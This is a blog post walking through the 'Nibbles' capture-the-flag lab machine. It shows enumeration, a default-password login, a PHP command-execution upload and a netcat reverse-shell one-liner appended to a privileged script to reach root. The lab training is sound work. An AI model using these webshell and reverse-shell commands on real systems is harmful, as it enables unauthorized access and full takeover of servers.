+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>❯ nmap -sC -p22,80 -n -oA nibbles_script_scan 10.10.10.75
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-06-23 20:55 -03
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.75
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.22s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE
+</span></span><span style="display:flex;"><span>22/tcp open  ssh
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">2048</span> c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp open  http
+</span></span><span style="display:flex;"><span>|_http-title: Site doesn<span style="color:#960050;background-color:#1e0010">&#39;</span>t have a title <span style="color:#f92672">(</span>text/html<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 7.59 seconds
+</span></span></code></pre></div><p>There was no useful information from this scan so we can continue enumerating the target.</p>
+<hr>
+<h3 id="checking-the-website-running-on-port-80-http">Checking the website running on port 80 (HTTP)</h3>
+<p>As soon as we type the target IP on our browser the website displayed it&rsquo;s just a simple h1 tag with the phrase &ldquo;Hello World&rdquo;. We assume there&rsquo;s nothing interesting here&hellip;</p>
+
+    <img src="../../../nibbles-machine-img/1.png"  alt="website-enum"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>But let&rsquo;s remember that there could always be something else hidden out there, especially if we see a cheesy message like “Hello World”, so why not check the source code of the page to see if we can find any clues.</p>
+
+    <img src="../../../nibbles-machine-img/2.png"  alt="website-enum"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>And there we have it, it seems that our intuition was right. So we could write down that address and see if we can find anything.</p>
+<p>Sometimes developers leave messages between themselves while they are building the site and for some reason forget to delete it&hellip; even credentials have been found in other scenarios.</p>
+<h4 id="checking-our-finding-nibbleblog">Checking our finding /nibbleblog/</h4>
+<p>As soon as we type /nibbleblog after the IP address the browser takes us to a new page where we seem to find an administration panel or something similar. Let&rsquo;s save it for later, it may be useful.</p>
+
+    <img src="../../../nibbles-machine-img/3.png"  alt="website-enum"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Something that would be very useful is to know what is nibbleblog, googling it we find the repository at <a href="https://github.com/dignajar/nibbleblog">https://github.com/dignajar/nibbleblog</a> and its creator tells us that nibbleblog is: Easy, fast and free CMS Blog. All you need is PHP to work.</p>
+<hr>
+<h3 id="looking-for-technologies-used-in-the-site">Looking for Technologies used in the site</h3>
+<p>There are many ways to know what technologies are used behind a website, and for us that&rsquo;s worth gold. Each piece we find along the way will help us solve the riddle.
+One way to find out this information is by using a tool called whatweb from our terminal.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>❯ whatweb http://10.10.10.75/nibbleblog
+</span></span><span style="display:flex;"><span>http://10.10.10.75/nibbleblog <span style="color:#f92672">[</span><span style="color:#ae81ff">301</span> Moved Permanently<span style="color:#f92672">]</span> Apache<span style="color:#f92672">[</span>2.4.18<span style="color:#f92672">]</span>, Country<span style="color:#f92672">[</span>RESERVED<span style="color:#f92672">][</span>ZZ<span style="color:#f92672">]</span>, HTTPServer<span style="color:#f92672">[</span>Ubuntu Linux<span style="color:#f92672">][</span>Apache/2.4.18 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)]</span>, IP<span style="color:#f92672">[</span>10.10.10.75<span style="color:#f92672">]</span>, RedirectLocation<span style="color:#f92672">[</span>http://10.10.10.75/nibbleblog/<span style="color:#f92672">]</span>, Title<span style="color:#f92672">[</span><span style="color:#ae81ff">301</span> Moved Permanently<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>http://10.10.10.75/nibbleblog/ <span style="color:#f92672">[</span><span style="color:#ae81ff">200</span> OK<span style="color:#f92672">]</span> Apache<span style="color:#f92672">[</span>2.4.18<span style="color:#f92672">]</span>, Cookies<span style="color:#f92672">[</span>PHPSESSID<span style="color:#f92672">]</span>, Country<span style="color:#f92672">[</span>RESERVED<span style="color:#f92672">][</span>ZZ<span style="color:#f92672">]</span>, HTML5, HTTPServer<span style="color:#f92672">[</span>Ubuntu Linux<span style="color:#f92672">][</span>Apache/2.4.18 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)]</span>, IP<span style="color:#f92672">[</span>10.10.10.75<span style="color:#f92672">]</span>, JQuery, MetaGenerator<span style="color:#f92672">[</span>Nibbleblog<span style="color:#f92672">]</span>, PoweredBy<span style="color:#f92672">[</span>Nibbleblog<span style="color:#f92672">]</span>, Script, Title<span style="color:#f92672">[</span>Nibbles - Yum yum<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>Reading the output of whatweb is not very difficult&hellip;let&rsquo;s break it down in pieces</p>
+<p>1.First response (CODE 301 Moved Permanently):</p>
+<ul>
+<li>URL: &ldquo;http://10.10.10.75/nibbleblog&rdquo;</li>
+<li>Status: 301 Moved Permanently</li>
+<li>Web Server: Apache 2.4.18 running on Ubuntu Linux</li>
+<li>IP: 10.10.10.75</li>
+<li>Redirect: To &ldquo;http://10.10.10.75/nibbleblog&rdquo;</li>
+</ul>
+<p>2.Second response (CODE 200 OK):</p>
+<ul>
+<li>URL: &ldquo;http://10.10.10.75/nibbleblog/&rdquo;</li>
+<li>Status: 200 OK</li>
+<li>Web Server: Apache 2.4.18 on Ubuntu Linux</li>
+<li>IP: 10.10.10.75</li>
+</ul>
+<p>Technologies detected:</p>
+<ul>
+<li>Cookies: PHPSESSID (indicates PHP session usage)</li>
+<li>HTML5</li>
+<li>JQuery</li>
+<li>Nibbleblog (CMS)</li>
+<li>Page Title: &ldquo;Nibbles - Yum yum&rdquo;</li>
+</ul>
+<hr>
+<h3 id="looking-for-exploits-on-nibbleblog">Looking for exploits on Nibbleblog</h3>
+<p>Searching in google we can see that there is an exploit for nibbleblog v4.0.3 that allows us to upload arbitrary files which we can use with the metasploit tool.</p>
+<p>If we enter the site &lt;www.exploit-db.com/exploits/38489&gt; and read the source code we can see that it targets the URI /admin.php.</p>
+<p>This could be helpful later on when we list the files contained in the website. What we still need to know is what version is running on our target. So let&rsquo;s write it down in our TODO list.</p>
+
+    <img src="../../../nibbles-machine-img/5.png"  alt="exploit-db website"  class="center"  style="border-radius: 8px;"  />
+
+
+<hr>
+<h3 id="enumerating-web-subdirectories">Enumerating web subdirectories</h3>
+<p>Now that we have some information about our target we should know what the structure of the website is.
+For this we will use gobuster one of the most useful tools to enumerate subdirectories in a web site.
+It should be noted that there are many other tools that perform a similar function but we will focus on this one for the moment, as its syntax is friendly and easy to use.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>gobuster -u <span style="color:#f92672">[</span>URL/IP<span style="color:#f92672">]</span> -w <span style="color:#f92672">[</span>WORDLIST<span style="color:#f92672">]</span> --&gt; syntax<span style="color:#960050;background-color:#1e0010">&#39;</span>s
+</span></span><span style="display:flex;"><span>gobuster -u 10.10.10.75 -w /opt/useful/seclist/Discovery/some-dictionary.txt
+</span></span></code></pre></div><p>We can also use other flags if needed like:</p>
+<ul>
+<li>-t: Number of concurrent threads (default is 10)</li>
+<li>-x: File extensions to search for</li>
+<li>-o: Output file to write results to</li>
+<li>-k: Skip TLS certificate verification</li>
+<li>-b: Status codes to blacklist (ignore)</li>
+<li>-s: Status codes to whitelist (only show these)</li>
+</ul>
+
+    <img src="../../../nibbles-machine-img/6.png"  alt="gobuster results"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>From the result obtained, some directories/files stand out at first sight: /admin , /admin.php and /README. Let&rsquo;s see what we can find there.</p>
+<h4 id="readme">/README</h4>
+
+    <img src="../../../nibbles-machine-img/7.png"  alt="readme finding"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>From the information shown in the README we are 100% sure that the website is vulnerable to the exploit found at &lt;www.exploits-db.com&gt;.</p>
+<h4 id="admin">/admin</h4>
+
+    <img src="../../../nibbles-machine-img/8.png"  alt="admin finding"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>In this directory I have spent a long time looking through all the directories and files but there is nothing that is interesting.</p>
+<h4 id="adminphp-login-page">/admin.php (login page)</h4>
+<p>We seem to be getting closer to our goal, we were able to locate a login form for the administrator tools.</p>
+<p>One thing we could do is try to guess the password and username using the most common combinations such as admin/admin, administrator/admin123 and others.</p>
+<p>But let&rsquo;s remember that we were warned that a blacklisting service is running in the background. So a brute force attack would be out of the question.</p>
+
+    <img src="../../../nibbles-machine-img/9.png"  alt="admin login form"  class="center"  style="border-radius: 8px;"  />
+
+
+<hr>
+<h3 id="re-checking-gobuster-output">Re-checking gobuster output</h3>
+<p>If we look again at the gobuster output we can see that another overlooked directory is available: /content . Let&rsquo;s see what it has.</p>
+
+    <img src="../../../nibbles-machine-img/10.png"  alt="gobuster result 2"  class="center"  style="border-radius: 8px;"  />
+
+
+<h4 id="private">/private</h4>
+<p>We went directly to the /private directory because it is more likely to find something of interest here than in the public/ or tmp/ directories.</p>
+
+    <img src="../../../nibbles-machine-img/11.png"  alt="private directory finding"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Looks like there are some nice XML files here!</p>
+<blockquote>
+<p>An XML file is a document that uses Extensible Markup Language (XML), which is a markup language designed to store and transport data in a format that is both human-readable and machine-readable</p>
+</blockquote>
+<hr>
+<h4 id="shadowphp----unreacheable">shadow.php &ndash;&gt; unreacheable</h4>
+<hr>
+<h4 id="usersxml">users.xml</h4>
+<p>A user called admin exist, also we can confirm again about the blacklist function.</p>
+
+    <img src="../../../nibbles-machine-img/12.png"  alt="xml files"  class="center"  style="border-radius: 8px;"  />
+
+
+<hr>
+<h4 id="configxml">config.xml</h4>
+<p>We found an email for the admin and the email used for nibbleblog</p>
+
+    <img src="../../../nibbles-machine-img/13.png"  alt="xml files"  class="center"  style="border-radius: 8px;"  />
+
+
+<h3 id="getting-the-admin-password">Getting the admin password</h3>
+<p>Something that catches our attention once we read the whole xml document is that the word nibbles appears in several occasions, also we could find that the password for the admin account was set during the installation by default. So maybe the password is a generic one? Is the password for the admin user nibbles?</p>
+<p>So going back to the login page (/admin.php) and typing nibbles as the password we got access to the admin dashboard</p>
+
+    <img src="../../../nibbles-machine-img/14.png"  alt="admin login success"  class="center"  style="border-radius: 8px;"  />
+
+
+<hr>
+<h3 id="enumerating-the-admin-dashboard">Enumerating the Admin Dashboard</h3>
+<ul>
+<li>
+<p>Publish &ndash;&gt; Allow us to make a simple post, video post, quote post, new page.</p>
+</li>
+<li>
+<p>Comments &ndash;&gt; allow us to see the comments on the page, nothing here.</p>
+</li>
+<li>
+<p>Manage &ndash;&gt; Allow us to manage post, pages and categories. The categories page have some functionality to add a new one.</p>
+</li>
+<li>
+<p>Setting &ndash;&gt; General settings, In comments we can deactivate the Sanitize HTML option (XSS possible attack), there are others setting for the comments like moderate comment can be deactivated and i can change the spam control to low detection level.</p>
+</li>
+<li>
+<p>themes &ndash;&gt; nothing interesting here</p>
+</li>
+<li>
+<p>Plugins &ndash;&gt; this section show us the plugins already installed and there are other plugins available to install.</p>
+</li>
+</ul>
+<hr>
+<h3 id="uploading-php-code-to-the-my-image-plugin">Uploading PHP code to the My image plugin</h3>
+<p>Once listed the functionalities that the website has, we can see that in the plugins section there is an especially interesting one which allows us to upload files/images to the site.</p>
+<p>If we remember the exploit that nibblesblog has and now that we know that the version that is running is vulnerable we could try injecting PHP code to see if we have luck (remember that PHP is the language that is used behind on the server. See whatweb results)</p>
+<p>What we must do is to write the following code in the terminal and save it in a file with php extension called myImage.php</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;&lt;?php system(&#39;</span><span style="color:#a6e22e">id</span><span style="color:#e6db74">&#39;); ?&gt;&#39;</span> <span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">myImage</span><span style="color:#f92672">.</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">or</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">touch</span> <span style="color:#a6e22e">myImage</span><span style="color:#f92672">.</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">nano</span> <span style="color:#a6e22e">myImage</span><span style="color:#f92672">.</span><span style="color:#a6e22e">php</span> <span style="color:#f92672">--&gt;</span> <span style="color:#a6e22e">paste</span> <span style="color:#a6e22e">the</span> <span style="color:#a6e22e">code</span> <span style="color:#a6e22e">into</span> <span style="color:#a6e22e">the</span> <span style="color:#a6e22e">file</span> <span style="color:#66d9ef">and</span> <span style="color:#a6e22e">save</span> <span style="color:#a6e22e">it</span> 
+</span></span></code></pre></div><hr>
+<p>Once this is done we only have to upload the file and see if we get the desired result. Do not panic if you see a lot of errors in the body of the website.</p>
+<hr>
+
+    <img src="../../../nibbles-machine-img/15.png"  alt="exploiting"  class="center"  style="border-radius: 8px;"  />
+
+
+<hr>
+<p>Now we must find where the file was hosted once it was successfully uploaded. And if we remember from the listing we did with gobuster there was a directory private/ with the directory plugins/ inside. So let&rsquo;s see if our file was saved there.</p>
+<hr>
+
+    <img src="../../../nibbles-machine-img/16.png"  alt="exploiting"  class="center"  style="border-radius: 8px;"  />
+
+
+<hr>
+<p>went to my_image/</p>
+<hr>
+
+    <img src="../../../nibbles-machine-img/17.png"  alt="exploiting"  class="center"  style="border-radius: 8px;"  />
+
+
+<hr>
+<p>And there is the file we uploaded, now let&rsquo;s try to run it and see if it works. We can run it from the URL or using curl from the terminal. Let&rsquo;s try first from the url.</p>
+<hr>
+<p>Browser
+
+    <img src="../../../nibbles-machine-img/18.png"  alt="exploiting"  class="center"  style="border-radius: 8px;"  />
+
+</p>
+<p>Terminal
+
+    <img src="../../../nibbles-machine-img/19.png"  alt="exploiting"  class="center"  style="border-radius: 8px;"  />
+
+</p>
+<hr>
+<h3 id="getting-a-reverse-shell">Getting a Reverse shell</h3>
+<p>Now that we know that the PHP code executes perfectly we can modify it to obtain a reverse shell.</p>
+
+    <img src="../../../nibbles-machine-img/20.png"  alt="reverse shell"  class="center"  style="border-radius: 8px;"  />
+
+
+<hr>
+<p>Then using the netcat tool we will listen on the port indicated in the file containing the reverse shell.</p>
+<hr>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>nc -lvnp <span style="color:#ae81ff">9443</span>
+</span></span></code></pre></div><hr>
+<p>Once executed if everything went well we should get the reverse shell and therefore access to the server.</p>
+<hr>
+
+    <img src="../../../nibbles-machine-img/21.png"  alt="reverse shell"  class="center"  style="border-radius: 8px;"  />
+
+
+<hr>
+<p>The terminal we have is quite simple, so if we execute the following python line we can have more options to work in the terminal, such as ctrl+L to clean the terminal.</p>
+<hr>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>python3 <span style="color:#e6db74">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span></code></pre></div><hr>
+<h3 id="getting-the-flag">Getting the flag</h3>
+<p>Now that we are inside the machine we can go to the user&rsquo;s home folder and there we will find the file containing the flag.</p>
+
+    <img src="../../../nibbles-machine-img/22.png"  alt="post exploit"  class="center"  style="border-radius: 8px;"  />
+
+
+<hr>
+<h3 id="privilege-escalation">Privilege escalation</h3>
+<p>Inside the nibbler user&rsquo;s home folder there is a zip file called persona.zip.</p>
+<p>We are going to decompress it using the unzip tool (there are others that we can use as 7z or tar to perform the same task).</p>
+<p>If we investigate its content we will find a .sh file which listing it with the command ls -l we can see that it has the permission type 4744 (setuid permission) which allows us to run it with the privileges of the root user.</p>
+<p>What we must do with this file is first of all to know that we must not change under any circumstances the content of it, that is why we are going to add a line of code to it which will give us another reverse shell but this time as if we were the root user. This line is called oneliner.</p>
+<p>Inside this oneliner we must put our ip address (the one in tun0) and the port in which we are going to be listening with netcat.</p>
+<hr>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.19 8443 &gt;/tmp/f&#39;</span> | tee -a monitor.sh
+</span></span></code></pre></div><hr>
+<p>Before executing the monitor.sh file, let&rsquo;s remember to listen to netcat.</p>
+<hr>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>nc -lvnp <span style="color:#ae81ff">8443</span>
+</span></span></code></pre></div><hr>
+<p>Then let&rsquo;s run the file and we will get the reverse shell as the root user. We perform the same step as with the other reverse shell to get an enhanced shell.</p>
+<hr>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>python3 -c <span style="color:#e6db74">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span></code></pre></div><hr>
+<p>Once obtained the reverse shell and being inside the machine as the root user, we go directly to your home folder (as we did with the user nibbler) and there we will find the flag.</p>
+<p>I hope you liked this step by step on how to solve the Nibbler machine, although this was tagged as an easy machine is complicated by the fact of the number of steps to be performed to get into it.</p>
+<p>Do not be discouraged if you are stuck in any machine or exercise, remember to stay calm and always think objectively!</p>
+]]></content>
+        </item>
+        
+    </channel>
+</rss>
